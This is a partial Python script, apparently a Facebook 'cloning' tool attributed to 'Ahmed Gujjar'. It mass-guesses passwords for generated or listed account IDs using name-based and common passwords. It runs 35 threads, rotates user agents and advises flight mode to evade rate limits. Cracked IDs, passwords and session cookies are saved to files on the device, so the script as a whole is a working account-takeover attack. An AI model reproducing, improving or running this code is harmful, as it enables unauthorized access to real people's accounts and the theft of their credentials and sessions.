...
def randBuildLSB():
    ...
    ua = f'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36)'+END
    return ua
#<------[main-ua]---->
def riazfile():
...
logo=("""\033[1;97m
   ...
   / ___ \    | .-. | [ `.-. .-. |/ /__\\/ /'`\' |  
 _/ /   \ \_  | | | |  | | | | | || \__.,| \__/  |  
|____| |____|[___]|__][___||__||__]'.__.' '.__.;__] 
                                                    
\33[1;37m----------------------------------------------
   Owner      :  Ahmed Gujjar
   Facebook   :  Ahmed Gujjar 
   Github     :  SPY-420
   Tool Type  :  Random
   Status     :  Free
   Version    :  0.2
...
def menu():
	clear()
	print('[1] File Create menu')
	print('[2] File Cloning [M1]')
	print('[3] File Cloning [M2]')
	print('[4] Random Number Cloning [M1]')
	print('[5] Random Number Cloning [M2]')
	print('[6] Random Clone Choice pass')
	print('\x1b[1;91m[07] Exit Programme')
	linex()
...
#<-----[Method~1]---->            
    def method1(self, rid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\x1b[1;97m[Ahmed] {loop}|{len(self.id)} \x1b[1;92mOK:-{len(oks)} {''.format(loop/float(len(self.id)))}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f'\r\r\x1b[1;92m[Ahmed-OK] {rid} | {ps}\033[1;97m')
                    oks.append(rid)
                    open('/sdcard/Ahmed-OK.txt','a').write(rid+'|'+ps+'\n');open('/sdcard/REFAT_iDs_COOKiES_M1.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f'\r\r\x1b[1;91m[Ahmed-CP] {rid} | {ps}\033[1;97m')
                     cps.append(rid)
                     open('/sdcard/Ahmed-CP.txt','a').write(rid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def method3(self, rid, name, psw):
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);rsbhai = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"fh={rsbhai};{ckkk}"
                    print(f'\r\r\x1b[1;91m[Ahmed-Ok] {rid} | {ps}\033[1;97m')
                    oks.append(rid)
                    open('/sdcard/Ahmed-OK.txt','a').write(rid+'|'+ps+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
...
def riazcp():
    ...
    print(' Ids saved in Ahmed-OK.txt,in cp Ahmed-CP.txt')
    linex()
    input(' Press Enter to Back')    
    os.system('python Ahmed.py')
#<------[Cloning]------>
        ...
        for ps in pwx:
           ...
           'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;31m[Ahmed-CP] '+uid+' | '+ps+'\033[0;97m')
                open('/sdcard/Ahmed-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[Ahmed.XD] %s|%s \x1b[1;92mOK:%s   \r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
#<-----[bd_clone]----->
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;31m[Ahmed-CP] '+cid+' | '+ps+'\033[0;97m')
                open('/sdcard/Ahmed-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\x1b[1;37m[Ahmed.XD] %s|%s| \x1b[1;92mOK:%s   \r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\x1b[1;97m[Ahmed.XD] %s| \033[1;32m OK:%s\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in RIAZ:
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;31m[Ahmed-CP] '+ids+' | '+pas+'\033[1;97m')
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in RIAZ:
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;31m[Ahmed-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/CP-Ahmed-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def bd2():
	...
	with ThreadPool(max_workers=35) as yaari:
		...
		print('[•] Total Acounts : '+tl)
		print('[•] Selected Code : \x1b[1;92m'+kode)
		print('\x1b[1;91m[•] Use Flight Mode For Better Result')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode,'free fire','bangladish','freefire']
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mAhmed.XD\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\033[1;92m[Ahmed-OK] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[Ahmed-CP] '+uid+' | '+ps+'\33[0;97m')
